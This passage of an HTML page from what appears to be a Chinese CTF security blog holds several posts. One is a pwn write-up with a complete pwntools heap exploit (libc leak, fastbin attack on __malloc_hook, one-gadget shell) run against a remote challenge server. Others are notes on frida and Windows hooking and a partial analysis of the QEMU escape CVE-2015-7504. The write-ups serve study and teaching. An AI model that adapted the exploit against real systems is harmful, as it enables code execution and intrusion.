flagenc = [<span class="number">27</span>,<span class="number">114</span>,<span class="number">17</span>,<span class="number">118</span>,<span class="number">8</span>,<span class="number">74</span>,<span class="number">126</span>,<span class="number">5</span>,<span class="number">55</span>,<span class="number">124</span>,<span class="number">31</span>,<span class="number">88</span>,<span class="number">104</span>,<span class="number">7</span>,<span class="number">112</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">108</span>,<span class="number">4</span>,<span class="number">47</span>,<span class="number">4</span>,<span class="number">105</span>,<span class="number">54</span>,<span class="number">77</span>,<span class="number">127</span>,<span class="number">8</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">109</span>,<span class="number">28</span>,<span class="number">127</span>,<span class="number">80</span>,<span class="number">29</span>,<span class="number">96</span>]
<span class="keyword">print</span> len(flagenc)
<span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):
    offset.append(a[i].count(<span class="string">"r"</span>)<span class="number">-1</span>-a[i].count(<span class="string">"a"</span>))
<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">-1</span>,<span class="number">-1</span>):
    flag += chr((flagenc[i]^flagenc[i<span class="number">-1</span>])-offset[i])
<span class="keyword">print</span> flag[::<span class="number">-1</span>]</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/HomuraVM/" data-id="cjyn83qds0001icthdtbksiu6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-homuranote" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/homuranote/" class="article-date">
  <time datetime="2019-07-28T17:11:01.666Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PWN/">PWN</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/homuranote/">Homuranote</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="cgctf-pwn300"><a href="#cgctf-pwn300" class="headerlink" title="cgctf pwn300"></a>cgctf pwn300</h1><h2 id="大概审查思路"><a href="#大概审查思路" class="headerlink" title="大概审查思路"></a>大概审查思路</h2><ul>
<li>据说这题是入门堆题,又是校队考核题目,入门一发堆吧</li>
<li>很经典的note结构,menu getnum switch-case选择功能</li>
<li>checksec 查一下,能开的都开了.</li>
<li>IDA打开后反编译,程序大概有5个功能,新建,删除,编辑,查看,退出</li>
<li>新建堆处很正常</li>
<li>删除堆,也就是free处,存在UAF</li>
<li>编辑处可以修改堆内的值</li>
</ul>
<h2 id="具体攻击思路"><a href="#具体攻击思路" class="headerlink" title="具体攻击思路"></a>具体攻击思路</h2><ul>
<li>fastbin attack劫持 _malloc_hook_</li>
<li>unsorted bin leak 程序基址</li>
<li>配合给好的libc文件进行攻击</li>
</ul>
<h2 id="具体攻击原理"><a href="#具体攻击原理" class="headerlink" title="具体攻击原理"></a>具体攻击原理</h2><h3 id="fastbin-atacck"><a href="#fastbin-atacck" class="headerlink" title="fastbin atacck"></a>fastbin atacck</h3><ul>
<li>一般利用doublefree,但是此程序给了edit函数,而且可以UAF,所以攻击方式随意</li>
<li>此处建立起一个单向链表,只需要chunk1指向chunk2然后指向chunk1,则下一个分配的堆块,就可以在任意地点(刚才edit写入或者doublefree后写入的)</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addnote(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x30</span>)<span class="comment">#chunk 1</span></span><br><span class="line">addnote(<span class="number">1</span>,<span class="string">"b"</span>*<span class="number">0x30</span>)<span class="comment">#chunk 2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">addnote(<span class="number">0</span>,fake_chunk_add)<span class="comment">#chunk 1</span></span><br><span class="line">addnote(<span class="number">2</span>,<span class="string">"a"</span>*<span class="number">0x30</span>)<span class="comment">#chunk 2</span></span><br><span class="line">addnote(<span class="number">3</span>,<span class="string">"c"</span>*<span class="number">0x30</span>)<span class="comment">#chunk 1</span></span><br><span class="line">addnote(<span class="number">4</span>,payload)<span class="comment">#attack</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addnote(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake_chunk_add)</span><br><span class="line">addnote(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x30</span>)</span><br><span class="line">addnote(<span class="number">1</span>,attack)</span><br></pre></td></tr></table></figure>

<ul>
<li>其实原理都差不多,都是利用fastbin内的内容与chunkhead之间在free和inuse时不同的布局来实现任意地址读写.</li>
</ul>
<h3 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h3><ul>
<li>申请两个堆块后,free堆块时,假如大小范围大于max_fast,则内存空间被划分到unsorted bin中,此时,调试可知,此时堆块的指针是一起指向&lt;main_arena+88&gt;中的(fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc中, 通过use after free后打印出main_arena的实际地址, 结合偏移值从而得到libc的加载地址)</li>
</ul>
<h3 id="OneGadget"><a href="#OneGadget" class="headerlink" title="OneGadget"></a>OneGadget</h3><ul>
<li>寻找现成的execvl(“/bin/sh”),免去构造system(“/bin/sh”),但是函数执行有条件,所以要多找几个onegadget尝试一下,最后覆写_malloc_hook_,在下一次malloc时,即可getshell.</li>
</ul>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./homuranote")</span></span><br><span class="line">r = remote(<span class="string">"45.76.173.177"</span>,<span class="number">6666</span>)</span><br><span class="line">main_arena_addr = <span class="number">0x397B00</span></span><br><span class="line">mallochook=<span class="number">0x397af0</span></span><br><span class="line">oneGadget=<span class="number">0xd694f</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(s)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Size:"</span>,str(len(s)))</span><br><span class="line">	r.sendlineafter(<span class="string">"Content:"</span>,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"2"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,s)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"3"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index:"</span>,str(index))</span><br><span class="line">	r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"4"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"Index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"START leak"</span>)</span><br><span class="line">addnote(<span class="string">"a"</span>*<span class="number">0x7f</span>)</span><br><span class="line">addnote(<span class="string">"b"</span>*<span class="number">0x7f</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">a = r.recvline()</span><br><span class="line">offset = u64(a[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">88</span></span><br><span class="line">libc_base = offset - main_arena_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libcbase: %x"</span>%libc_base</span><br><span class="line">success(<span class="string">"SUCCESS leak"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"START FASTBIN ATTACK"</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(libc_base + mallochook<span class="number">-0x20</span><span class="number">-3</span>) + <span class="number">0x58</span>*<span class="string">'\x00'</span></span><br><span class="line">padding=<span class="string">'\x00'</span>*(<span class="number">0x10</span>+<span class="number">3</span>) + p64(libc_base + oneGadget) + <span class="string">'\x00'</span>*(<span class="number">0x58</span><span class="number">-0x10</span><span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line">addnote(<span class="string">"a"</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">addnote(<span class="string">"c"</span>*<span class="number">0x60</span>)</span><br><span class="line">addnote(padding)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"get shell"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ls </span><br><span class="line">[1]+  Stopped                 python exp.py</span><br><span class="line">mozhucy@ubuntu:~/Desktop/kh$ python exp.py</span><br><span class="line">[+] Opening connection to 45.76.173.177 on port 6666: Done</span><br><span class="line">[+] START leak</span><br><span class="line">libcbase: 7f9858333000</span><br><span class="line">[+] SUCCESS leak</span><br><span class="line">[+] START FASTBIN ATTACK</span><br><span class="line">[+] get shell</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Ok,index:4.</span><br><span class="line">1.add</span><br><span class="line">2.show</span><br><span class="line">3.edit</span><br><span class="line">4.delete</span><br><span class="line">5.exit</span><br><span class="line">choice&gt;&gt;$ 1</span><br><span class="line">Size:$ 2</span><br><span class="line">$ ls</span><br><span class="line">flag94539</span><br><span class="line">$ cat flag94539</span><br><span class="line">flag&#123;R3al1y_****_h3aP_****&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/homuranote/" data-id="cjyn83qeh0014icthbctxegt4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-frida" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/frida/" class="article-date">
  <time datetime="2019-07-28T17:11:01.661Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/frida/">Hook学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><ul>
<li>hook实际上可以理解成一个劫持程序流的过程,我们可以在想劫持的地方写入钩子函数,然后程序执行到那里时,会先执行我们写的代码,然后ret源程序执行流,在我们的代码部分,我们可以检控程序中的一些变量,还可以更改这些变量,一般实战中,hook会被用于做键盘,鼠标,窗口,日志等部分的消息钩取</li>
<li>在ctf中,我们可以利用hook来监控程序中特定变量的值,帮助分析程序,同时,patchkit的pt.hook()其实也用了相同的东西,hook和patch相比,对程序影响较小,不用担心大量patch给程序带来的副作用</li>
</ul>
<h1 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h1><ul>
<li>frida是一款基于python和JavaScript的框架,支持大部分主流平台,frida使用的是动态二进制插桩技术,对二进制文件没有任何影响</li>
<li>要注意,frida关键的hook部分代码的话,是要用javascript编写的,应为frida的原理是在服务器上起服务,然后利用ptrace来调试程序</li>
</ul>
<h1 id="frida的使用方法"><a href="#frida的使用方法" class="headerlink" title="frida的使用方法"></a>frida的使用方法</h1><ul>
<li>首先还是要import frida,然后就可以attach一个进程:p = frida.attach(“re”),枚举模块p.enumerate_modules(),我们想读取程序中的值后还需要提前知道进程的加载基址,枚举目标进程映射的所有内存范围enumerate_ranges(mask),读写内存:read_bytes(address,n),write_bytes(address,n)</li>
<li></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/frida/" data-id="cjyn83qeg0011icthyhci3k7o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-DLL注入0x1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/DLL注入0x1/" class="article-date">
  <time datetime="2019-07-28T17:11:01.652Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/DLL注入0x1/">初试windows消息钩取</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="windows消息流"><a href="#windows消息流" class="headerlink" title="windows消息流:"></a>windows消息流:<br></h2><p>发生键盘输入事件时,WM_KEYDOWN消息添加到系统消息队列.<br><br>系统判断哪个应用程序中发生了时间,然后从消息队列中取出消息,添加到相应应用程序的应用程序消息队列<br><br>应用程序监视自身的[应用程序消息队列],发现新添加的WM<br>_KEYDOWN,调用相应的事件处理程序处理.<br></p>
<h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>在OS消息队列与应用程序消息队列存在一条”钩链”,设置好键盘钩子后,钩子会比应用程序先看到程序相应消息,钩子还可以修改,拦截消息.</p>
<h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> idHook,         <span class="comment">//hook type</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HOOKPROC lpfn,      <span class="comment">//hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hMod,     <span class="comment">//hook produre所属的DLL句柄(Handle)</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwThreadID,   <span class="comment">//挂载的ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/DLL注入0x1/" data-id="cjyn83qdn0000ictheczcmb8n" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-cve-2015-7504" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/cve-2015-7504/" class="article-date">
  <time datetime="2019-07-28T17:11:01.647Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/cve-2015-7504/">CVE-2015-7504 QEMU虚拟机逃逸漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h1><ul>
<li>QEMU是一套模拟处理器,在Linux平台上使用广泛,一般虚拟机的漏洞分为两大类,DoS和逃逸,其中逃逸的漏洞威胁最大,但是挖掘难度也很大.</li>
<li>漏洞多出现于IO部分,因为交互需要许多长度未定的数据,所以在数据处理的代码中,往往会出现一些类似于溢出的漏洞,一般通过这些溢出,就能达到使虚拟机crash的目的</li>
</ul>
<h1 id="分析目的"><a href="#分析目的" class="headerlink" title="分析目的"></a>分析目的</h1><ul>
<li>这里想要通过已经给出POC的漏洞,以及qemu开源的优势来熟悉虚拟机漏洞的成因以及原理,方便以后对于不同种类虚拟机的漏洞挖掘</li>
</ul>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>卡在这里好久,一直是VNC server running on 127.0.0.1:5900,缺少SDL库,一开始按照网上的教程apt安装了一下,但是还是会出现SDL support no,后来发现还有另一个高版本的SDL库,安装之后重新编译就搞定了.</li>
<li>这里我才用的是Ubuntu1604作为qemu的载体,Ubuntu是通过PD搭建在我的mac上的,三层虚拟化还是有一些小问题的.</li>
<li>先来说一般的安装步骤,因为要调试的是以前的漏洞,当前版本的qemu肯定是不行的,这里采用git clone来获取之前版本的源码,而且编译的话也方便进行调试和源码分析,而不是apt-get</li>
<li><code>git clone git://git.qemu-project.org/qemu.git</code></li>
<li>获取源码以后,configure加上参数生成makefile文件,然后直接make &amp;&amp; make install进行编译</li>
<li>创建镜像,这里我直接采用了qemu提供的debian.qcow2,因为调试的是qemu,所以和qemu内的系统关系不是很大</li>
<li>调试器这里采用CTF中比较常用的名叫pwndbg的gdb插件来进行调试(因为用习惯了233333</li>
</ul>
<h2 id="内核调试方法"><a href="#内核调试方法" class="headerlink" title="内核调试方法"></a>内核调试方法</h2><ul>
<li>调试模式启动虚拟机加上-S选项,并且要指定一个网卡,不然的话是remote不上去的,回车以后虚拟机启动的时候会被断下来.</li>
<li>进入<code>ctrl + alt + 2</code>窗口,输入gdbserver tcp::9999</li>
<li>执行gdb,输入<code>target remote localhost:9999</code>开始调试,之后就是下短点看内存之类的操作了</li>
</ul>
<h2 id="qemu调试方法"><a href="#qemu调试方法" class="headerlink" title="qemu调试方法"></a>qemu调试方法</h2><ul>
<li><code>gdb qemu-system-x86</code></li>
<li>输入<code>set args xx.qcow2</code></li>
<li>等待启动以后,设置断点,run,就能看到源码和对应的汇编,内存了.</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><ul>
<li>首先这一个堆溢出漏洞,漏洞点在网卡模拟的部分,这里的数据溢出可以覆盖到qemu即将调用的Handel的值,即我们可以通过这个溢出来进行逃逸</li>
<li><code>b pcnet_receive</code>下断,设置main断点,运行,正常运行,c继续运行,启动好虚拟机后,将静态编译好的poc放在文件夹内,<code>python -m SimpleHTTPserver 8090</code>,在文件夹里起一个简单的服务器,在qemu起的虚拟机内,利用wget获取编译好的poc,然后进行调试,注意宿主机的ip默认为10.0.2.2,这里<code>wget 10.0.2.2:8090/a.out</code></li>
<li></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/cve-2015-7504/" data-id="cjyn83qed000xicthg0o7tkvh" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE/">CVE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/FE/">FE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/balabala/">balabala</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/9102/07/">July 9102</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/9102/07/29/杂谈/">写在前面</a>
          </li>
        
          <li>
            <a href="/2019/07/29/pe-elf/">pe-elf文件结构解析</a>
          </li>
        
          <li>
            <a href="/2019/07/29/ollvm/">anti-ollvm</a>
          </li>
        
          <li>
            <a href="/2019/07/29/io_file/">io_file学习</a>
          </li>
        
          <li>
            <a href="/2019/07/29/windows/">windows反调试总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>